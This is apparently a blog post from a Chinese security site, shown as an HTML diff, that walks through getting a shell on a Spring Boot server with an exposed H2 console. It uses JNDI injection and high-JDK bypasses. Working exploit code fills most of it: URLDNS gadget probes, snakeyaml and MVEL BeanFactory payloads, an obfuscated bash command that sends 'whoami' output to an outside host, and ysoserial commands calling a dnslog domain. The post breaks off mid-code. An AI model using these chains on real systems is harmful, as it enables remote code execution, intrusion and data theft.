@@ -1,0 +1,469 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>从Spring Boot H2 Database到GetShell | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="0x1. 切入点在日常测试的时候，使用ffuf发现一个/console的接口，打开之后发现是H2 Database页面：如果Spring Boot项目中包含h2database并且在配置文件中启用h2-console，则存在JNDI注入漏洞.
+设置Driver Class为javax.naming.InitialContext，JDBC URL为ldap://attacker.com/Exploit：根据/env泄漏的信息，得知Java版本是1.8.0_312，高版本JDK中由于默认codebase为true从而导致客户端默认不会请求远程Server上的恶意 Class, 因此不可以直接使用LDAP加载远程恶意代码。
+
+RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 trueLDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true
+
+0x2. 绕过和利用利用本地Class作为Reference Factory绕过利用URLDNS链可以探测Java黑盒应用里面某个类是否存在, 在珂字辈和c0ny1师傅的两篇文章讲的很详细：
+
+Urldns链探测类工具发放
+构造java探测class反序列化gadget
+老链新用，利用URLDNS链探测gadget
+
+URLDNS的测试代码，生成一个序列化的数据包1.ser：
+package test;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.net.URL;
+import java.util.HashMap;
+import javassist.ClassPool;
+import javassist.CtClass;
+
+
+public class Urldns &amp;#123;
+    public static void main(String[] args) throws Exception &amp;#123;
+        HashMap hashMap = new HashMap();
+          URL url = new URL(&#34;http://333.f9575af1.dns.1433.eu.org&#34;);
+          Field f = Class.forName(&#34;java.net.URL&#34;).getDeclaredField(&#34;hashCode&#34;);
+          f.setAccessible(true);
+          f.set(url, 1);
+          //hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);
+          hashMap.put(url, makeClass(&#34;org.apache.commons.beanutils.BeanComparator&#34;));
+          f.set(url, -1);
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&#34;1.ser&#34;));
+        oos.writeObject(hashMap);
+        //ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&#34;1.ser&#34;));
+        //ois.readObject();
+    &amp;#125;
+    public static Class makeClass(String clazzName) throws Exception&amp;#123;
+        ClassPool classPool = ClassPool.getDefault();
+        CtClass ctClass = classPool.makeClass(clazzName);
+        Class clazz = ctClass.toClass();
+        ctClass.defrost();
+        return clazz;
+    &amp;#125;
+&amp;#125;"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="从Spring Boot H2 Database到GetShell"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 从Spring Boot H2 Database到GetShell</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="0x1-切入点"><a href="#0x1-切入点" class="headerlink" title="0x1. 切入点"></a>0x1. 切入点</h2><p>在日常测试的时候，使用ffuf发现一个<code>/console</code>的接口，打开之后发现是H2 Database页面：<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>如果Spring Boot项目中包含h2database并且在配置文件中启用h2-console，则存在<a target="_blank" rel="noopener" href="https://anquan.baidu.com/article/1078">JNDI注入漏洞</a>.</p>
+<p>设置<code>Driver Class</code>为<code>javax.naming.InitialContext</code>，<code>JDBC URL</code>为<code>ldap://attacker.com/Exploit</code>：<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>根据<code>/env</code>泄漏的信息，得知Java版本是1.8.0_312，高版本JDK中由于默认codebase为true从而导致客户端默认不会请求远程Server上的恶意 Class, 因此不可以直接使用LDAP加载远程恶意代码。</p>
+<blockquote>
+<p>RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true<br>LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true</p>
+</blockquote>
+<h2 id="0x2-绕过和利用"><a href="#0x2-绕过和利用" class="headerlink" title="0x2. 绕过和利用"></a>0x2. 绕过和利用</h2><h3 id="利用本地Class作为Reference-Factory绕过"><a href="#利用本地Class作为Reference-Factory绕过" class="headerlink" title="利用本地Class作为Reference Factory绕过"></a>利用本地Class作为Reference Factory绕过</h3><p>利用URLDNS链可以探测Java黑盒应用里面某个类是否存在, 在珂字辈和c0ny1师傅的两篇文章讲的很详细：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li>
+</ul>
+<p>URLDNS的测试代码，生成一个序列化的数据包<code>1.ser</code>：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>
+          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>
+        <span class="token comment">//ois.readObject();</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>因为动态生成的类也可以被反序列化，因此上面代码生成的序列化数据，最好在另外一个环境里面反序列化测试。<br>post请求提交上面生成的<code>1.ser</code>到<code>/yso</code>接口，如果生成<code>1.ser</code>里面的类在反序列化的时候存在，则会收到dnslog请求：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span>
+
+
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">ThreadContext</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">.</span></span><span class="token class-name">UpperLookup</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletInputStream</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@ResponseBody</span>
+<span class="token annotation punctuation">@RestController</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClass</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/yso"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">URLDemo</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">ServletInputStream</span> inputStream <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">)</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"X-Api-Version"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> apiVersion<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+        <span class="token class-name">ThreadContext</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"apiVersion"</span><span class="token punctuation">,</span> apiVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Received a request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">UpperLookup</span> upperLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpperLookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>upperLookup<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token string">"Hello, API Controller!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>珂字辈师傅已经写好了<a target="_blank" rel="noopener" href="https://github.com/kezibei/Urldns">URLDNS</a>，可以生成探测需要的序列化数据包。当存在JNDI注入的时候，启动LDAP服务:<code>java -jar Urldns.jar ldap all &lt;dnslog&gt;</code>，<br>然后使用PAYLOAD: <code>ldap://&lt;ip&gt;:1389/Hello233</code>。</p>
+<h4 id="Snkeyml"><a href="#Snkeyml" class="headerlink" title="Snkeyml"></a>Snkeyml</h4><p>借用Ceye.io探测H2 Database的页面，发现可以利用的链很多，比如<code>cc1, cb17、mvel、snakeyaml</code>等，其中<code>cc1、cb17</code>这些链属于LDAP反序列化，<code>mvel、snkeyaml</code>属于加载本地Class。<br>浅蓝师傅在<a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">探索高版本 JDK 下 JNDI 漏洞的利用方法</a>里面讲的很详细，这里选择使用<code>snkeyml</code>攻击，主要利用代码：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_snakeyaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.yaml.snakeyaml.Yaml"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>
+            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token class-name">String</span> yaml <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>
+            <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>
+            <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n"</span> <span class="token operator">+</span>
+            <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>
+            <span class="token string">"]"</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=load"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> yaml<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> ref<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在服务端使用RMI托管，然后开启<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">yaml-payload.jar</a>，可以成功执行命令。</p>
+<h4 id="Mvel"><a href="#Mvel" class="headerlink" title="Mvel"></a>Mvel</h4><p>在更换MVEL执行的时候，本地测试弹计算器成功，但是换成执行命令就会失败，使用IDEA本地调试之后发现把push去掉，然后可以执行命令成功，具体原因需要再跟踪一遍：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ReferenceWrapper</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span>
+<span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>
+            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>
+            <span class="token string">"Runtime.getRuntime().exec('bash -c &#123;echo,Y3VybCBiYWlkdS5jb20vYHdob2FtaWA=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="利用LDAP返回反序列化数据，触发本地Gadget绕过"><a href="#利用LDAP返回反序列化数据，触发本地Gadget绕过" class="headerlink" title="利用LDAP返回反序列化数据，触发本地Gadget绕过"></a>利用LDAP返回反序列化数据，触发本地Gadget绕过</h3><p>LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的<code>javaSerializedData</code>属性值不为空，则客户端的<code>obj.decodeObject()</code>方法就会对这个字段的内容进行反序列化，攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。</p>
+<p>使用CC链可以测试成功，可以执行命令：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy
+java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>但是在使用CB链的时候，执行命令失败:<br><img src="/2022/03/18/from-spring-boot-to-getshell/13.png"><br>可以从报错原因看出来，因为CommonsBeanutils1的版本不同，不同版本中BeanComparator这个类的<a target="_blank" rel="noopener" href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java#L119">SerialVersionUID不一样</a>，会造成反序列化失败。1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608。<br>有两种解决方法：</p>
+<ul>
+<li>替换ysoserial的CommonsBeanutils1，使用<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1575">魔改版本的ysoserial</a></li>
+<li>生成反序列化数据之后，<a target="_blank" rel="noopener" href="https://github.com/phith0n/zkar">修改SUID</a>为对应版本的值</li>
+</ul>
+<p>刚好早上看到P师傅发的文章，尝试使用<a target="_blank" rel="noopener" href="https://github.com/phith0n/zkar">zkar</a>修改ysoserial生成的序列化数据包，可以执行命令成功。</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
+
+<span class="token keyword">import</span> <span class="token punctuation">(</span>
+	<span class="token string">"github.com/phith0n/zkar/serz"</span>
+	<span class="token string">"io/ioutil"</span>
+	<span class="token string">"log"</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	data<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"cb1.ser"</span><span class="token punctuation">)</span>
+	serialization<span class="token punctuation">,</span> err <span class="token operator">:=</span> serz<span class="token punctuation">.</span><span class="token function">FromBytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+		log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span><span class="token string">"parse error"</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#125;</span>
+
+	object <span class="token operator">:=</span> serialization<span class="token punctuation">.</span>Contents<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Object
+	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> field <span class="token operator">:=</span> <span class="token keyword">range</span> object<span class="token punctuation">.</span>ClassDatas<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>FieldDatas <span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span> field<span class="token punctuation">.</span>TypeCode <span class="token operator">==</span> <span class="token string">"L"</span> <span class="token punctuation">&#123;</span>
+			classPonter <span class="token operator">:=</span> field<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>serz<span class="token punctuation">.</span>TCObject<span class="token punctuation">)</span><span class="token punctuation">.</span>ClassPointer
+			<span class="token keyword">if</span> classPonter<span class="token punctuation">.</span>Flag <span class="token operator">==</span> serz<span class="token punctuation">.</span>JAVA_TC_CLASSDESC <span class="token operator">&amp;&amp;</span>
+				classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>ClassName<span class="token punctuation">.</span>Data <span class="token operator">==</span> <span class="token string">"org.apache.commons.beanutils.BeanComparator"</span> <span class="token punctuation">&#123;</span>
+				classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>SerialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3490850999041592962</span>
+				<span class="token keyword">break</span>
+			<span class="token punctuation">&#125;</span>
